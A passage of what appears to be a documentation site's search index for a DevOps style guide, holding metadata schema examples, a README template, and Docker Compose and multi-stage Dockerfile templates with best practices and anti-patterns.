CryptContext(schemes=[\"bcrypt\"], deprecated=\"auto\")\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#terraform-vpc-module","title":"Terraform VPC Module","text":"<pre><code>/**\n * @module aws_vpc_networking\n * @description Creates AWS VPC with public/private subnets across 3 AZs, NAT gateways, and route tables\n * @dependencies aws_vpc, aws_subnet, aws_internet_gateway, aws_nat_gateway, aws_route_table\n * @version 2.3.1\n * @author Tyler Dukes\n * @last_updated 2025-10-27\n * @status stable\n * @terraform_version &gt;= 1.0\n * @env prod, staging, dev\n * @security_classification internal\n */\n\nvariable \"vpc_cidr\" {\n  description = \"CIDR block for VPC\"\n  type        = string\n  default     = \"10.0.0.0/16\"\n}\n\nvariable \"environment\" {\n  description = \"Environment name (prod, staging, dev)\"\n  type        = string\n}\n\nresource \"aws_vpc\" \"main\" {\n  cidr_block           = var.vpc_cidr\n  enable_dns_hostnames = true\n  enable_dns_support   = true\n\n  tags = {\n    Name        = \"${var.environment}-vpc\"\n    Environment = var.environment\n    ManagedBy   = \"Terraform\"\n  }\n}\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#bash-deployment-script","title":"Bash Deployment Script","text":"<pre><code>#!/usr/bin/env bash\n#\n## @module deploy_to_staging\n## @description Deploys application to staging environment with health checks and rollback capability\n## @dependencies aws-cli &gt;= 2.0, jq, docker &gt;= 20.10\n## @version 1.4.2\n## @author Tyler Dukes\n## @last_updated 2025-10-27\n## @status stable\n## @env staging\n## @security_classification internal\n## @depends_on ./scripts/health_check.sh, ./scripts/rollback.sh\n#\n\nset -euo pipefail\n\nreadonly SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" &amp;&amp; pwd)\"\nreadonly APP_NAME=\"${APP_NAME:-myapp}\"\nreadonly ENVIRONMENT=\"staging\"\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#migration-guide","title":"Migration Guide","text":"","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#adding-metadata-to-existing-code","title":"Adding Metadata to Existing Code","text":"<p>Step 1: Identify all modules without metadata</p> <pre><code>## Find Python files without @module tag\nfind . -name \"*.py\" -exec grep -L \"@module\" {} \\;\n</code></pre> <p>Step 2: Add minimal metadata block</p> <pre><code>\"\"\"\n@module [infer_from_filename]\n@description [TODO: Add description]\n@version 0.1.0\n\"\"\"\n</code></pre> <p>Step 3: Progressively enhance</p> <ul> <li>Add <code>@author</code> and <code>@last_updated</code></li> <li>Document <code>@dependencies</code> from imports</li> <li>Add <code>@api_endpoints</code> for API modules</li> <li>Specify <code>@env</code> and <code>@status</code></li> </ul> <p>Step 4: Validate</p> <pre><code>python scripts/validate_metadata.py --fix .\n</code></pre>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"03_metadata_schema/schema_reference/#references","title":"References","text":"<ul> <li>Semantic Versioning 2.0.0</li> <li>JSDoc Tag Reference</li> <li>Python Docstring Conventions (PEP 257)</li> <li>Terraform Module Structure</li> </ul>","tags":["metadata","schema","annotations","ai","validation"]},{"location":"04_templates/README_template/","title":"README Template","text":"","tags":["template","readme","documentation","standards"]},{"location":"04_templates/README_template/#purpose","title":"Purpose","text":"<p>Short description.</p>","tags":["template","readme","documentation","standards"]},{"location":"04_templates/README_template/#usage","title":"Usage","text":"<pre><code>module \"example\" { source = \"git::ssh://...//modules/example?ref=v1.0.0\" }\n</code></pre>","tags":["template","readme","documentation","standards"]},{"location":"04_templates/README_template/#inputs","title":"Inputs","text":"Name Type Required Default Description","tags":["template","readme","documentation","standards"]},{"location":"04_templates/README_template/#outputs","title":"Outputs","text":"Name Description","tags":["template","readme","documentation","standards"]},{"location":"04_templates/README_template/#examples","title":"Examples","text":"<p>Provide example usage and notes.</p>","tags":["template","readme","documentation","standards"]},{"location":"04_templates/docker_compose_template/","title":"Docker Compose Template","text":"","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#overview","title":"Overview","text":"<p>This document provides comprehensive Docker Compose templates for orchestrating multi-container applications. Docker Compose simplifies the management of multi-container environments for development, testing, and production.</p>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#full-stack-web-application","title":"Full-Stack Web Application","text":"<pre><code>version: '3.8'\n\nservices:\n  # Frontend service\n  frontend:\n    build:\n      context: ./frontend\n      dockerfile: Dockerfile\n      target: production\n    ports:\n      - \"3000:3000\"\n    environment:\n      - NODE_ENV=production\n      - API_URL=http://backend:8000\n    depends_on:\n      backend:\n        condition: service_healthy\n    networks:\n      - app-network\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD\", \"wget\", \"--quiet\", \"--tries=1\", \"--spider\", \"http://localhost:3000\"]\n      interval: 30s\n      timeout: 5s\n      retries: 3\n      start_period: 10s\n\n  # Backend service\n  backend:\n    build:\n      context: ./backend\n      dockerfile: Dockerfile\n    ports:\n      - \"8000:8000\"\n    environment:\n      - DATABASE_URL=postgresql://postgres:${DB_PASSWORD}@database:5432/appdb\n      - REDIS_URL=redis://redis:6379\n      - SECRET_KEY=${SECRET_KEY}\n    depends_on:\n      database:\n        condition: service_healthy\n      redis:\n        condition: service_started\n    volumes:\n      - ./backend/logs:/app/logs\n    networks:\n      - app-network\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:8000/health\"]\n      interval: 30s\n      timeout: 5s\n      retries: 3\n      start_period: 15s\n\n  # PostgreSQL database\n  database:\n    image: postgres:15-alpine\n    environment:\n      - POSTGRES_DB=appdb\n      - POSTGRES_USER=postgres\n      - POSTGRES_PASSWORD=${DB_PASSWORD}\n    volumes:\n      - postgres-data:/var/lib/postgresql/data\n      - ./database/init:/docker-entrypoint-initdb.d:ro\n    networks:\n      - app-network\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U postgres\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\n  # Redis cache\n  redis:\n    image: redis:7-alpine\n    command: redis-server --appendonly yes\n    volumes:\n      - redis-data:/data\n    networks:\n      - app-network\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD\", \"redis-cli\", \"ping\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\n  # Nginx reverse proxy\n  nginx:\n    image: nginx:1.25-alpine\n    ports:\n      - \"80:80\"\n      - \"443:443\"\n    volumes:\n      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro\n      - ./nginx/ssl:/etc/nginx/ssl:ro\n    depends_on:\n      - frontend\n      - backend\n    networks:\n      - app-network\n    restart: unless-stopped\n\nnetworks:\n  app-network:\n    driver: bridge\n\nvolumes:\n  postgres-data:\n  redis-data:\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#development-environment","title":"Development Environment","text":"<pre><code>version: '3.8'\n\nservices:\n  app:\n    build:\n      context: .\n      dockerfile: Dockerfile.dev\n    ports:\n      - \"3000:3000\"\n    environment:\n      - NODE_ENV=development\n      - DEBUG=*\n    volumes:\n      # Mount source code for hot reload\n      - ./src:/app/src\n      - ./public:/app/public\n      # Use named volume for node_modules\n      - node_modules:/app/node_modules\n    command: npm run dev\n    networks:\n      - dev-network\n    stdin_open: true\n    tty: true\n\n  database:\n    image: postgres:15-alpine\n    environment:\n      - POSTGRES_DB=devdb\n      - POSTGRES_USER=devuser\n      - POSTGRES_PASSWORD=devpass\n    ports:\n      # Expose database port for local tools\n      - \"5432:5432\"\n    volumes:\n      - postgres-dev-data:/var/lib/postgresql/data\n    networks:\n      - dev-network\n\n  mailhog:\n    image: mailhog/mailhog:latest\n    ports:\n      - \"1025:1025\"  # SMTP\n      - \"8025:8025\"  # Web UI\n    networks:\n      - dev-network\n\nnetworks:\n  dev-network:\n\nvolumes:\n  node_modules:\n  postgres-dev-data:\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#microservices-architecture","title":"Microservices Architecture","text":"<pre><code>version: '3.8'\n\nservices:\n  # API Gateway\n  api-gateway:\n    build: ./services/api-gateway\n    ports:\n      - \"8080:8080\"\n    environment:\n      - SERVICE_AUTH_URL=http://auth-service:8001\n      - SERVICE_USER_URL=http://user-service:8002\n      - SERVICE_ORDER_URL=http://order-service:8003\n    depends_on:\n      - auth-service\n      - user-service\n      - order-service\n    networks:\n      - frontend-network\n      - backend-network\n    restart: unless-stopped\n\n  # Authentication service\n  auth-service:\n    build: ./services/auth\n    environment:\n      - DB_HOST=auth-db\n      - REDIS_HOST=redis\n    depends_on:\n      auth-db:\n        condition: service_healthy\n    networks:\n      - backend-network\n      - auth-network\n    restart: unless-stopped\n\n  auth-db:\n    image: postgres:15-alpine\n    environment:\n      - POSTGRES_DB=authdb\n      - POSTGRES_PASSWORD=${AUTH_DB_PASSWORD}\n    volumes:\n      - auth-db-data:/var/lib/postgresql/data\n    networks:\n      - auth-network\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready\"]\n      interval: 10s\n\n  # User service\n  user-service:\n    build: ./services/user\n    environment:\n      - DB_HOST=user-db\n    depends_on:\n      user-db:\n        condition: service_healthy\n    networks:\n      - backend-network\n      - user-network\n    restart: unless-stopped\n\n  user-db:\n    image: postgres:15-alpine\n    environment:\n      - POSTGRES_DB=userdb\n      - POSTGRES_PASSWORD=${USER_DB_PASSWORD}\n    volumes:\n      - user-db-data:/var/lib/postgresql/data\n    networks:\n      - user-network\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready\"]\n      interval: 10s\n\n  # Order service\n  order-service:\n    build: ./services/order\n    environment:\n      - DB_HOST=order-db\n      - RABBITMQ_HOST=rabbitmq\n    depends_on:\n      order-db:\n        condition: service_healthy\n      rabbitmq:\n        condition: service_healthy\n    networks:\n      - backend-network\n      - order-network\n    restart: unless-stopped\n\n  order-db:\n    image: postgres:15-alpine\n    environment:\n      - POSTGRES_DB=orderdb\n      - POSTGRES_PASSWORD=${ORDER_DB_PASSWORD}\n    volumes:\n      - order-db-data:/var/lib/postgresql/data\n    networks:\n      - order-network\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready\"]\n      interval: 10s\n\n  # Message queue\n  rabbitmq:\n    image: rabbitmq:3-management-alpine\n    environment:\n      - RABBITMQ_DEFAULT_USER=admin\n      - RABBITMQ_DEFAULT_PASS=${RABBITMQ_PASSWORD}\n    ports:\n      - \"15672:15672\"  # Management UI\n    volumes:\n      - rabbitmq-data:/var/lib/rabbitmq\n    networks:\n      - backend-network\n    restart: unless-stopped\n    healthcheck:\n      test: [\"CMD\", \"rabbitmq-diagnostics\", \"ping\"]\n      interval: 30s\n      timeout: 10s\n      retries: 5\n\n  # Shared Redis cache\n  redis:\n    image: redis:7-alpine\n    command: redis-server --appendonly yes\n    volumes:\n      - redis-data:/data\n    networks:\n      - backend-network\n    restart: unless-stopped\n\nnetworks:\n  frontend-network:\n    driver: bridge\n  backend-network:\n    driver: bridge\n  auth-network:\n    driver: bridge\n  user-network:\n    driver: bridge\n  order-network:\n    driver: bridge\n\nvolumes:\n  auth-db-data:\n  user-db-data:\n  order-db-data:\n  rabbitmq-data:\n  redis-data:\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#production-configuration","title":"Production Configuration","text":"<pre><code>version: '3.8'\n\nservices:\n  app:\n    image: myapp:${VERSION:-latest}\n    deploy:\n      replicas: 3\n      restart_policy:\n        condition: on-failure\n        max_attempts: 3\n      resources:\n        limits:\n          cpus: '1.0'\n          memory: 1G\n        reservations:\n          cpus: '0.5'\n          memory: 512M\n    environment:\n      - NODE_ENV=production\n      - DATABASE_URL=${DATABASE_URL}\n    secrets:\n      - db_password\n      - api_key\n    logging:\n      driver: json-file\n      options:\n        max-size: \"10m\"\n        max-file: \"3\"\n    networks:\n      - prod-network\n\n  database:\n    image: postgres:15-alpine\n    environment:\n      - POSTGRES_PASSWORD_FILE=/run/secrets/db_password\n    volumes:\n      - type: volume\n        source: postgres-data\n        target: /var/lib/postgresql/data\n        volume:\n          nocopy: true\n    secrets:\n      - db_password\n    deploy:\n      placement:\n        constraints:\n          - node.role == manager\n    networks:\n      - prod-network\n\nsecrets:\n  db_password:\n    external: true\n  api_key:\n    external: true\n\nnetworks:\n  prod-network:\n    driver: overlay\n    attachable: true\n\nvolumes:\n  postgres-data:\n    driver: local\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#development-with-override","title":"Development with Override","text":"","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#docker-composeyml-base","title":"docker-compose.yml (Base)","text":"<pre><code>version: '3.8'\n\nservices:\n  app:\n    build: .\n    environment:\n      - DATABASE_URL=postgresql://postgres:postgres@database/appdb\n    networks:\n      - app-network\n\n  database:\n    image: postgres:15-alpine\n    environment:\n      - POSTGRES_DB=appdb\n      - POSTGRES_PASSWORD=postgres\n    networks:\n      - app-network\n\nnetworks:\n  app-network:\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#docker-composeoverrideyml-development","title":"docker-compose.override.yml (Development)","text":"<pre><code>version: '3.8'\n\nservices:\n  app:\n    build:\n      target: development\n    ports:\n      - \"3000:3000\"\n    volumes:\n      - ./src:/app/src\n    command: npm run dev\n\n  database:\n    ports:\n      - \"5432:5432\"\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#docker-composeprodyml-production","title":"docker-compose.prod.yml (Production)","text":"<pre><code>version: '3.8'\n\nservices:\n  app:\n    build:\n      target: production\n    restart: unless-stopped\n    logging:\n      driver: json-file\n      options:\n        max-size: \"10m\"\n\n  database:\n    restart: unless-stopped\n    volumes:\n      - postgres-data:/var/lib/postgresql/data\n\nvolumes:\n  postgres-data:\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#common-patterns","title":"Common Patterns","text":"","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#using-yaml-anchors","title":"Using YAML Anchors","text":"<pre><code>version: '3.8'\n\nx-logging: &amp;default-logging\n  driver: json-file\n  options:\n    max-size: \"10m\"\n    max-file: \"3\"\n\nx-healthcheck: &amp;default-healthcheck\n  interval: 30s\n  timeout: 5s\n  retries: 3\n  start_period: 10s\n\nservices:\n  frontend:\n    build: ./frontend\n    logging: *default-logging\n    healthcheck:\n      &lt;&lt;: *default-healthcheck\n      test: [\"CMD\", \"wget\", \"--spider\", \"http://localhost:3000\"]\n\n  backend:\n    build: ./backend\n    logging: *default-logging\n    healthcheck:\n      &lt;&lt;: *default-healthcheck\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:8000/health\"]\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#environment-specific-variables","title":"Environment-Specific Variables","text":"<pre><code>version: '3.8'\n\nservices:\n  app:\n    image: myapp:${TAG:-latest}\n    environment:\n      - ENV=${ENVIRONMENT:-development}\n      - LOG_LEVEL=${LOG_LEVEL:-info}\n      - MAX_CONNECTIONS=${MAX_CONNECTIONS:-100}\n    ports:\n      - \"${APP_PORT:-3000}:3000\"\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#build-arguments","title":"Build Arguments","text":"<pre><code>version: '3.8'\n\nservices:\n  app:\n    build:\n      context: .\n      dockerfile: Dockerfile\n      args:\n        - BUILD_DATE=${BUILD_DATE}\n        - VERSION=${VERSION}\n        - NODE_VERSION=20\n      cache_from:\n        - myapp:latest\n      labels:\n        - \"com.example.version=${VERSION}\"\n        - \"com.example.build-date=${BUILD_DATE}\"\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#best-practices","title":"Best Practices","text":"","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#health-checks","title":"Health Checks","text":"<pre><code>services:\n  # HTTP health check\n  web:\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:8000/health\"]\n      interval: 30s\n      timeout: 5s\n      retries: 3\n      start_period: 10s\n\n  # Database health check\n  postgres:\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U postgres\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\n  # Redis health check\n  redis:\n    healthcheck:\n      test: [\"CMD\", \"redis-cli\", \"ping\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#resource-limits","title":"Resource Limits","text":"<pre><code>services:\n  app:\n    deploy:\n      resources:\n        limits:\n          cpus: '2.0'\n          memory: 2G\n          pids: 100\n        reservations:\n          cpus: '1.0'\n          memory: 1G\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#logging-configuration","title":"Logging Configuration","text":"<pre><code>services:\n  app:\n    logging:\n      driver: json-file\n      options:\n        max-size: \"10m\"\n        max-file: \"3\"\n        labels: \"app,environment\"\n        env: \"APP_NAME,ENVIRONMENT\"\n\n  # Syslog driver\n  syslog-app:\n    logging:\n      driver: syslog\n      options:\n        syslog-address: \"tcp://192.168.0.42:123\"\n        tag: \"{{.Name}}/{{.ID}}\"\n\n  # Fluentd driver\n  fluentd-app:\n    logging:\n      driver: fluentd\n      options:\n        fluentd-address: localhost:24224\n        tag: docker.{{.Name}}\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#secrets-management","title":"Secrets Management","text":"<pre><code>version: '3.8'\n\nservices:\n  app:\n    secrets:\n      - source: db_password\n        target: /run/secrets/db_password\n        mode: 0400\n    environment:\n      - DB_PASSWORD_FILE=/run/secrets/db_password\n\nsecrets:\n  db_password:\n    file: ./secrets/db_password.txt\n\n  # For production with Docker Swarm\n  api_key:\n    external: true\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#anti-patterns","title":"Anti-Patterns","text":"","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#avoid-exposing-all-ports","title":"\u274c Avoid: Exposing All Ports","text":"<pre><code>## Bad - Exposes database to host\nservices:\n  database:\n    ports:\n      - \"5432:5432\"  # Don't expose in production\n\n## Good - Use networks for internal communication\nservices:\n  database:\n    expose:\n      - 5432\n    networks:\n      - backend\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#avoid-using-latest-tag","title":"\u274c Avoid: Using :latest Tag","text":"<pre><code>## Bad - Unpredictable versions\nservices:\n  app:\n    image: myapp:latest\n\n## Good - Pin specific versions\nservices:\n  app:\n    image: myapp:1.2.3\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#avoid-hardcoded-secrets","title":"\u274c Avoid: Hardcoded Secrets","text":"<pre><code>## Bad - Secrets in plain text\nenvironment:\n  - DB_PASSWORD=supersecret123\n\n## Good - Use environment variables or secrets\nenvironment:\n  - DB_PASSWORD=${DB_PASSWORD}\nsecrets:\n  - db_password\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#avoid-missing-restart-policies","title":"\u274c Avoid: Missing Restart Policies","text":"<pre><code>## Bad - Service won't restart on failure\nservices:\n  app:\n    build: .\n\n## Good - Define restart policy\nservices:\n  app:\n    build: .\n    restart: unless-stopped\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#useful-commands","title":"Useful Commands","text":"<pre><code>## Start services\ndocker-compose up -d\n\n## Start with specific file\ndocker-compose -f docker-compose.prod.yml up -d\n\n## View logs\ndocker-compose logs -f app\n\n## Execute command in running container\ndocker-compose exec app bash\n\n## Scale services\ndocker-compose up -d --scale worker=3\n\n## Rebuild and start\ndocker-compose up -d --build\n\n## Stop and remove containers\ndocker-compose down\n\n## Stop and remove with volumes\ndocker-compose down -v\n\n## Validate compose file\ndocker-compose config\n\n## Check service status\ndocker-compose ps\n\n## View resource usage\ndocker-compose top\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#env-template","title":".env Template","text":"<pre><code>## Application\nAPP_NAME=myapp\nENVIRONMENT=production\nVERSION=1.0.0\n\n## Database\nDB_PASSWORD=changeme\nDB_NAME=appdb\nDB_USER=postgres\n\n## Redis\nREDIS_PASSWORD=changeme\n\n## Secrets\nSECRET_KEY=changeme\nAPI_KEY=changeme\n\n## Ports\nAPP_PORT=3000\nDB_PORT=5432\n\n## Resource Limits\nCPU_LIMIT=2.0\nMEMORY_LIMIT=2G\n</code></pre>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#references","title":"References","text":"","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#official-documentation","title":"Official Documentation","text":"<ul> <li>Docker Compose Documentation</li> <li>Compose File Reference</li> <li>Compose CLI Reference</li> </ul>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#best-practices_1","title":"Best Practices","text":"<ul> <li>Docker Compose Best Practices</li> <li>Docker Compose for Production</li> </ul>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/docker_compose_template/#tools","title":"Tools","text":"<ul> <li>docker-compose-viz - Visualize compose files</li> <li>composerize - Convert docker run to compose</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["docker-compose","containers","orchestration","microservices"]},{"location":"04_templates/dockerfile_template/","title":"Dockerfile Template","text":"","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#overview","title":"Overview","text":"<p>This document provides comprehensive multi-stage Dockerfile templates for building optimized, secure container images across all languages and frameworks. Multi-stage builds reduce image size, improve security, and enable better layer caching.</p>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#python-application","title":"Python Application","text":"<pre><code>## Multi-stage build for Python application\nFROM python:3.12-slim AS builder\n\n## Install build dependencies\nRUN apt-get update &amp;&amp; apt-get install -y \\\n    gcc \\\n    g++ \\\n    make \\\n    libpq-dev \\\n    &amp;&amp; rm -rf /var/lib/apt/lists/*\n\n## Set working directory\nWORKDIR /app\n\n## Copy dependency files\nCOPY requirements.txt requirements-prod.txt ./\n\n## Install dependencies\nRUN pip install --no-cache-dir --upgrade pip &amp;&amp; \\\n    pip install --no-cache-dir -r requirements-prod.txt\n\n## Production stage\nFROM python:3.12-slim AS production\n\n## Install runtime dependencies only\nRUN apt-get update &amp;&amp; apt-get install -y \\\n    libpq5 \\\n    &amp;&amp; rm -rf /var/lib/apt/lists/*\n\n## Create non-root user\nRUN groupadd -r appuser &amp;&amp; useradd -r -g appuser appuser\n\n## Set working directory\nWORKDIR /app\n\n## Copy installed packages from builder\nCOPY --from=builder /usr/local/lib/python3.12/site-packages /usr/local/lib/python3.12/site-packages\nCOPY --from=builder /usr/local/bin /usr/local/bin\n\n## Copy application code\nCOPY --chown=appuser:appuser . .\n\n## Switch to non-root user\nUSER appuser\n\n## Expose application port\nEXPOSE 8000\n\n## Health check\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n    CMD python -c \"import urllib.request; urllib.request.urlopen('http://localhost:8000/health')\"\n\n## Run application\nCMD [\"python\", \"-m\", \"uvicorn\", \"app.main:app\", \"--host\", \"0.0.0.0\", \"--port\", \"8000\"]\n</code></pre>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#nodejs-typescript-application","title":"Node.js / TypeScript Application","text":"<pre><code>## Multi-stage build for Node.js/TypeScript application\nFROM node:20-alpine AS builder\n\n## Set working directory\nWORKDIR /app\n\n## Copy package files\nCOPY package*.json ./\n\n## Install all dependencies (including dev dependencies)\nRUN npm ci\n\n## Copy source code\nCOPY . .\n\n## Build TypeScript application\nRUN npm run build\n\n## Prune dev dependencies\nRUN npm prune --production\n\n## Production stage\nFROM node:20-alpine AS production\n\n## Install dumb-init for proper signal handling\nRUN apk add --no-cache dumb-init\n\n## Create non-root user\nRUN addgroup -g 1001 -S nodejs &amp;&amp; adduser -S nodejs -u 1001\n\n## Set working directory\nWORKDIR /app\n\n## Copy built application and production dependencies\nCOPY --from=builder --chown=nodejs:nodejs /app/dist ./dist\nCOPY --from=builder --chown=nodejs:nodejs /app/node_modules ./node_modules\nCOPY --from=builder --chown=nodejs:nodejs /app/package*.json ./\n\n## Switch to non-root user\nUSER nodejs\n\n## Expose application port\nEXPOSE 3000\n\n## Health check\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n    CMD node -e \"require('http').get('http://localhost:3000/health', (r) =&gt; {process.exit(r.statusCode === 200 ? 0 : 1)})\"\n\n## Use dumb-init to handle signals properly\nENTRYPOINT [\"dumb-init\", \"--\"]\n\n## Run application\nCMD [\"node\", \"dist/index.js\"]\n</code></pre>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#go-application","title":"Go Application","text":"<pre><code>## Multi-stage build for Go application\nFROM golang:1.21-alpine AS builder\n\n## Install build dependencies\nRUN apk add --no-cache git ca-certificates\n\n## Set working directory\nWORKDIR /app\n\n## Copy go mod files\nCOPY go.mod go.sum ./\n\n## Download dependencies\nRUN go mod download\n\n## Copy source code\nCOPY . .\n\n## Build application with optimizations\nRUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build \\\n    -ldflags='-w -s -extldflags \"-static\"' \\\n    -a \\\n    -o /app/server \\\n    ./cmd/server\n\n## Production stage - minimal image\nFROM scratch AS production\n\n## Copy CA certificates from builder\nCOPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/\n\n## Copy binary from builder\nCOPY --from=builder /app/server /server\n\n## Expose application port\nEXPOSE 8080\n\n## Health check (note: scratch doesn't have shell, so limited options)\n## For health checks, consider using a sidecar or external monitoring\n\n## Run application\nENTRYPOINT [\"/server\"]\n</code></pre>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#react-nextjs-application","title":"React / Next.js Application","text":"<pre><code>## Multi-stage build for React/Next.js application\nFROM node:20-alpine AS dependencies\n\n## Set working directory\nWORKDIR /app\n\n## Copy package files\nCOPY package*.json ./\n\n## Install dependencies\nRUN npm ci\n\n## Builder stage\nFROM node:20-alpine AS builder\n\nWORKDIR /app\n\n## Copy dependencies from previous stage\nCOPY --from=dependencies /app/node_modules ./node_modules\n\n## Copy application code\nCOPY . .\n\n## Build application\nENV NEXT_TELEMETRY_DISABLED 1\nRUN npm run build\n\n## Production stage\nFROM node:20-alpine AS production\n\n## Install dumb-init\nRUN apk add --no-cache dumb-init\n\n## Create non-root user\nRUN addgroup -g 1001 -S nodejs &amp;&amp; adduser -S nextjs -u 1001\n\nWORKDIR /app\n\n## Copy necessary files\nCOPY --from=builder /app/public ./public\nCOPY --from=builder /app/.next/standalone ./\nCOPY --from=builder /app/.next/static ./.next/static\n\n## Set ownership\nRUN chown -R nextjs:nodejs /app\n\n## Switch to non-root user\nUSER nextjs\n\n## Expose port\nEXPOSE 3000\n\nENV PORT 3000\nENV NODE_ENV production\nENV NEXT_TELEMETRY_DISABLED 1\n\n## Health check\nHEALTHCHECK --interval=30s --timeout=3s --start-period=10s --retries=3 \\\n    CMD node -e \"require('http').get('http://localhost:3000', (r) =&gt; {process.exit(r.statusCode === 200 ? 0 : 1)})\"\n\n## Run application\nENTRYPOINT [\"dumb-init\", \"--\"]\nCMD [\"node\", \"server.js\"]\n</code></pre>","tags":["docker","dockerfile","containers","multi-stage","security"]},{"location":"04_templates/dockerfile_template/#django-application","title":"Django Application","text":"<pre><code>## Multi-stage build for Django application\nFROM python:3.12-slim AS builder\n\n## Set environment variables\nENV PYTHONDONTWRITEBYTECODE=1 \\\n    PYTHONUNBUFFERED=1 \\\n    PIP_NO_CACHE_DIR=1 \\\n    PIP_DISABLE_PIP_VERSION_CHECK=1\n\n## Install build dependencies\nRUN apt-get update &amp;&amp; apt-get install -y \\\n    gcc \\\n    postgresql-client \\\n    libpq-dev \\\n    &amp;&amp; rm -rf /var/lib/apt/lists/*\n\nWORKDIR /app\n\n## Copy dependency files\nCOPY requirements.txt ./\n\n## Install Python dependencies\nRUN pip install --upgrade pip &amp;&amp; \\\n    pip install -r requirements.txt\n\n## Production stage\nFROM python:3.12-slim AS production\n\n## Set environment variables\nENV PYTHONDONTWRITEBYTECODE=1 \\\n    PYTHONUNBUFFERED=1 \\\n    DJANGO_SETTINGS_MODULE=config.settings.production\n\n## Install runtime dependencies\nRUN apt-get update &amp;&amp; apt-get install -y \\\n    postgresql-client \\\n    libpq5 \\\n    &amp;&amp; rm -rf /var/lib/apt/lists/*\n\n## Create non-root user\nRUN groupadd -r django &amp;&amp; useradd -r -g django django\n\nWORKDIR /app\n\n## Copy installed packages\nCOPY --from=builder /usr/local/lib/python3.12/site-packages /usr/local/lib/python3.12/site-packages\nCOPY --from=builder /usr/local/bin /usr/local/bin\n\n## Copy application code\nCOPY --chown=django:django . .\n\n## Collect static files\nRUN python manage.py collectstatic --noinput\n\n## Switch to non-root user\nUSER django\n\n## Expose port\nEXPOSE 8000\n\n## Health check\nHEALTHCHECK 